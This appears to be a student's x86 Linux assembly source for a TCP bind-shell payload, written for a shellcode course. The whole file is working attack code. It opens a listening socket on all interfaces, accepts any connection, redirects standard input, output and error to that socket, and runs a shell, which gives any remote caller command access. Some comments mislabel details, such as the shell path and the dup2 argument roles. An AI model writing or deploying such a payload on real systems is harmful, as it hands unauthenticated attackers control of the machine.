; A1 - Shell_Bind_TCP
; William Mark Moody
; PA-25640
; 27.12.2021

global _start

section .text
_start:
	
	; socketcall (int call, unsigned long *args);
	; socket (int domain, int type, int protocol);

	push byte 0x6 			; int protocol => IPPROTO_TCP = 0x6
	push byte 0x1			; int type => SOCK_STREAM = 0x1
	push byte 0x2			; int domain => AF_INET = 0x2

	xor eax, eax
	mov al, 0x66			; SYS_SOCKETCALL = 102
	mov esi, eax			; Save for later (to reduce shellcode length)
	xor ebx, ebx
	mov bl, 0x1				; int call => SYS_SOCKET = 0x1
	mov ecx, esp			; unsigned long *args => arguments for socket()
	int 0x80

	mov edi, eax			; Save the return value for later (sockfd)

	; socketcall (int call, unsigned long *args);
	; setsockopt (int sockfd, int level, int optname, 
	;             const void *optval, socklen_t optlen);

	push byte 0x4			; socklen_t optlen => sizeof(0x1) = 4 bytes
	push dword esp			; const void *optval => pointer to true
	push byte 0x2			; int optname => SO_REUSEADDR = 0x2
	push byte 0x1			; int level => SOL_SOCKET = 0x1
	push dword eax			; int sockfd => return value from SYS_SOCKET

	mov eax, esi			; SYS_SOCKETCALL = 102
	mov bl, 0xe				; int call => SYS_SETSOCKOPT = 0xe
	mov ecx, esp			; unsigned long *args => arguments for setsockopt()
	int 0x80

	; socketcall (int call, unsigned long *args);
	; bind (int sockfd, const struct sockaddr *addr,
	;       socklen_t addrlen);

	; struct sockaddr_in {
	;     short sin_family;			-- 2 bytes, AF_INET
	;     unsigned short sin_port;  -- 2 bytes, htons(<PORT>)
	;     struct in_addr;           -- 4 bytes, INADDR_ANY (0x00000000)
	;     char sin_zero[8];         -- 8 bytes, 0x00000000 0x00000000
	; }

	; struct in_addr {
	;     unsigned long s_addr;
	; }

	xor ebx, ebx
	push dword eax			; char sin_zero[8] 2/2 => 0x00000000
	push dword eax			; char sin_zero[8] 1/2 => 0x00000000
	push dword eax			; struct in_addr => INADDR_ANY = 0x00000000
	push word PLACEHOLDER	; unsigned short sin_port => inserted by wrapper.py
	mov bl, 0x2
	push word bx			; short sin_family => AF_INET = 0x2

	mov ecx, esp			; Save pointer to struct

	push byte 0x10			; socklen_t addrlen => 16 bytes (see above)
	push dword ecx			; const struct sockaddr *addr =>
	push dword edi			; int sockfd => return value from SYS_SOCKET

	mov eax, esi			; SYS_SOCKETCALL = 102
							; int call => SYS_BIND = 0x2 
							; EBX is already 0x2 from above (reducing length)
	mov ecx, esp			; unsigned long *args => arguments for bind()
	int 0x80

	; socketcall (int call, unsigned long *args);
	; listen (int sockfd, int backlog);

	xor ebx, ebx
	push dword ebx			; int backlog => 0
	push dword edi			; int sockfd => return value from SYS_SOCKET

	mov eax, esi			; SYS_SOCKETCALL = 102
	mov bl, 0x4				; int call => SYS_LISTEN = 0x4
	mov ecx, esp			; unsigned long *args => arguments for listen()
	int 0x80

	; socketcall (int call, unsigned long *args);
	; accept (int sockfd, struct sockaddr *addr, socklen_t *addrlen);

	; NOTE: In this shellcode, it is irrelevant who connects to the
	;       port, so I will pass a NULL for both the second and third
	;       arguments

	xor ebx, ebx
	push dword ebx			; socklen_t *addrlen => NULL
	push dword ebx			; struct sockaddr *addr => NULL
	push dword edi			; int sockfd => return value from SYS_SOCKET

	mov eax, esi			; SYS_SOCKETCALL = 102
	mov bl, 0x5				; int call => SYS_ACCEPT = 0x5
	mov ecx, esp			; unsigned long *args => arguments for accept()
	int 0x80

	mov ebx, eax			; Store the return value (client fd) in EBX,
							; since it will be used in the dup2 calls.

	; dup2 (int oldfd, int newfd);

	xor eax, eax
	mov al, 0x3f			; SYS_DUP2 = 0x3f
							; int newfd => return value from SYS_ACCEPT
	xor ecx, ecx			; int oldfd => STDIN = 0x0
	int 0x80

	; dup2 (int oldfd, int newfd);

							; Assuming success, result will be 0x0, so we
							; don't need to clear EAX
	mov al, 0x3f			; SYS_DUP2 = 0x3f
							; int newfd => return value from SYS_ACCEPT
	inc ecx					; int oldfd => STDOUT = 0x1
	int 0x80

	; dup2 (int oldfd, int newfd);

							; Assuming success, result will be 0x1, so we
							; don't need to clear EAX
	mov al, 0x3f			; SYS_DUP2 = 0x3f
							; int newfd => return value from SYS_ACCEPT
	inc ecx					; int oldfd => STDERR = 0x2
	int 0x80

	; execve (const char *pathname, char *const argv[],
	;         char *const envp[]);

	push byte 0x68			; ...h
	push dword 0x7361622f	; sab/
	push dword 0x6e69622f	; nib/

	mov ebx, esp			; const char *pathname => *"//bin/sh"
	xor eax, eax
	push eax
	mov edx, esp			; char *const envp[] => NULL
	push ebx,
	mov ecx, esp			; char *const argv[] => *{*"//bin/sh"}
	mov al, 0xb				; SYS_EXECVE = 0xb
	int 0x80
